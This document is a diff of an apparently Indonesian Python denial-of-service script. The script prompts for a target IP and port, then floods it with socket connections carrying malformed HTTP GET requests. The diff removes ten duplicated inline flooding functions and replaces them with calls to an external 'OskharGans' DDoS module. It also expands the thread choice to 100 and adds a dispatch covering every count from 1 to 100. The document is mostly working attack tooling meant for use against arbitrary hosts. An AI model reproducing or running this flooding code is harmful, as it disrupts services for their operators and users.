@@ -239,122 +239,11 @@ if jawaban == "1":
 	print ("\033[96mMasukan PORT target:")
 	port= int(input("\033[91m>>> \033[93m"))
 	def if1():
-		print ("\033[96mMasukan jumblah thread [1-10] :")
+		print ("\033[96mMasukan jumblah thread [1-100] :")
 		th= int(input("\033[91m>>> \033[93m"))
 		return th
+	OskharGans.DDoS(port,target)
 	th=if1()
-	fake_ip="127.0.0.1"
-	already_connected=1
-
-	def os1():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os2():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os3():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os4():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os5():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os6():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os7():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os8():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os9():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
-
-	def os10():
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target,port))
-		s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
-		s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
-		s.close()
-
-		global already_connected
-		print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
-		already_connected += 1
 
 
 	def t1():
@@ -400,83 +289,205 @@ if jawaban == "1":
 
 	def if2(th):
 		if th == 1:
-			tth1.start()
-
+			OskharGans.Dos1()
 		elif th == 2:
-			tth1.start()
-			tth2.start()
-
+			OskharGans.Dos2()
 		elif th == 3:
-			tth1.start()
-			tth2.start()
-			tth3.start()
-
+			OskharGans.Dos3()
 		elif th == 4:
-			tth1.start()
-			tth2.start()
-			tth3.start()
-			tth4.start()
-
+			OskharGans.Dos4()
 		elif th == 5:
-			tth1.start()
-			tth2.start()
-			tth3.start()
-			tth4.start()
-			tth5.start()
-
+			OskharGans.Dos5()
 		elif th == 6:
-			tth1.start()
-			tth2.start()
-			tth3.start()
-			tth4.start()
-			tth5.start()
-			tth6.start()
-
-
+			OskharGans.Dos6()
 		elif th == 7:
-			tth1.start()
-			tth2.start()
-			tth3.start()
-			tth4.start()
-			tth5.start()
-			tth6.start()
-			tth7.start()
-
-
+			OskharGans.Dos7()
 		elif th == 8:
-			tth1.start()
-			tth2.start()
-			tth3.start()
-			tth4.start()
-			tth5.start()
-			tth6.start()
-			tth7.start()
-			tth8.start()
-
-
+			OskharGans.Dos8()
 		elif th == 9:
-			tth1.start()
-			tth2.start()
-			tth3.start()
-			tth4.start()
-			tth5.start()
-			tth6.start()
-			tth7.start()
-			tth8.start()
-			tth9.start()
-
-
+			OskharGans.Dos9()
 		elif th == 10:
-			tth1.start()
-			tth2.start()
-			tth3.start()
-			tth4.start()
-			tth5.start()
-			tth6.start()
-			tth7.start()
-			tth8.start()
-			tth9.start()
-			tth10.start()
+			OskharGans.Dos10()
+		elif th == 11:
+			OskharGans.Dos11()
+		elif th == 12:
+			OskharGans.Dos12()
+		elif th == 13:
+			OskharGans.Dos13()
+		elif th == 14:
+			OskharGans.Dos14()
+		elif th == 15:
+			OskharGans.Dos15()
+		elif th == 16:
+			OskharGans.Dos16()
+		elif th == 17:
+			OskharGans.Dos17()
+		elif th == 18:
+			OskharGans.Dos18()
+		elif th == 19:
+			OskharGans.Dos19()
+		elif th == 20:
+			OskharGans.Dos20()
+		elif th == 21:
+			OskharGans.Dos21()
+		elif th == 22:
+			OskharGans.Dos22()
+		elif th == 23:
+			OskharGans.Dos23()
+		elif th == 24:
+			OskharGans.Dos24()
+		elif th == 25:
+			OskharGans.Dos25()
+		elif th == 26:
+			OskharGans.Dos26()
+		elif th == 27:
+			OskharGans.Dos27()
+		elif th == 28:
+			OskharGans.Dos28()
+		elif th == 29:
+			OskharGans.Dos29()
+		elif th == 30:
+			OskharGans.Dos30()
+		elif th == 31:
+			OskharGans.Dos31()
+		elif th == 32:
+			OskharGans.Dos32()
+		elif th == 33:
+			OskharGans.Dos33()
+		elif th == 34:
+			OskharGans.Dos34()
+		elif th == 35:
+			OskharGans.Dos35()
+		elif th == 36:
+			OskharGans.Dos36()
+		elif th == 37:
+			OskharGans.Dos37()
+		elif th == 38:
+			OskharGans.Dos38()
+		elif th == 39:
+			OskharGans.Dos39()
+		elif th == 40:
+			OskharGans.Dos40()
+		elif th == 41:
+			OskharGans.Dos41()
+		elif th == 42:
+			OskharGans.Dos42()
+		elif th == 43:
+			OskharGans.Dos43()
+		elif th == 44:
+			OskharGans.Dos44()
+		elif th == 45:
+			OskharGans.Dos45()
+		elif th == 46:
+			OskharGans.Dos46()
+		elif th == 47:
+			OskharGans.Dos47()
+		elif th == 48:
+			OskharGans.Dos48()
+		elif th == 49:
+			OskharGans.Dos49()
+		elif th == 50:
+			OskharGans.Dos50()
+		elif th == 51:
+			OskharGans.Dos51()
+		elif th == 52:
+			OskharGans.Dos52()
+		elif th == 53:
+			OskharGans.Dos53()
+		elif th == 54:
+			OskharGans.Dos54()
+		elif th == 55:
+			OskharGans.Dos55()
+		elif th == 56:
+			OskharGans.Dos56()
+		elif th == 57:
+			OskharGans.Dos57()
+		elif th == 58:
+			OskharGans.Dos58()
+		elif th == 59:
+			OskharGans.Dos59()
+		elif th == 60:
+			OskharGans.Dos60()
+		elif th == 61:
+			OskharGans.Dos61()
+		elif th == 62:
+			OskharGans.Dos62()
+		elif th == 63:
+			OskharGans.Dos63()
+		elif th == 64:
+			OskharGans.Dos64()
+		elif th == 65:
+			OskharGans.Dos65()
+		elif th == 66:
+			OskharGans.Dos66()
+		elif th == 67:
+			OskharGans.Dos67()
+		elif th == 68:
+			OskharGans.Dos68()
+		elif th == 69:
+			OskharGans.Dos69()
+		elif th == 70:
+			OskharGans.Dos70()
+		elif th == 71:
+			OskharGans.Dos71()
+		elif th == 72:
+			OskharGans.Dos72()
+		elif th == 73:
+			OskharGans.Dos73()
+		elif th == 74:
+			OskharGans.Dos74()
+		elif th == 75:
+			OskharGans.Dos75()
+		elif th == 76:
+			OskharGans.Dos76()
+		elif th == 77:
+			OskharGans.Dos77()
+		elif th == 78:
+			OskharGans.Dos78()
+		elif th == 79:
+			OskharGans.Dos79()
+		elif th == 80:
+			OskharGans.Dos80()
+		elif th == 81:
+			OskharGans.Dos81()
+		elif th == 82:
+			OskharGans.Dos82()
+		elif th == 83:
+			OskharGans.Dos83()
+		elif th == 84:
+			OskharGans.Dos84()
+		elif th == 85:
+			OskharGans.Dos85()
+		elif th == 86:
+			OskharGans.Dos86()
+		elif th == 87:
+			OskharGans.Dos87()
+		elif th == 88:
+			OskharGans.Dos88()
+		elif th == 89:
+			OskharGans.Dos89()
+		elif th == 90:
+			OskharGans.Dos90()
+		elif th == 91:
+			OskharGans.Dos91()
+		elif th == 92:
+			OskharGans.Dos92()
+		elif th == 93:
+			OskharGans.Dos93()
+		elif th == 94:
+			OskharGans.Dos94()
+		elif th == 95:
+			OskharGans.Dos95()
+		elif th == 96:
+			OskharGans.Dos96()
+		elif th == 97:
+			OskharGans.Dos97()
+		elif th == 98:
+			OskharGans.Dos98()
+		elif th == 99:
+			OskharGans.Dos99()
+		elif th == 100:
+			OskharGans.Dos100()
 
 		else:
 			print ("\033[91mJawab yang bener tolol\033[92m")
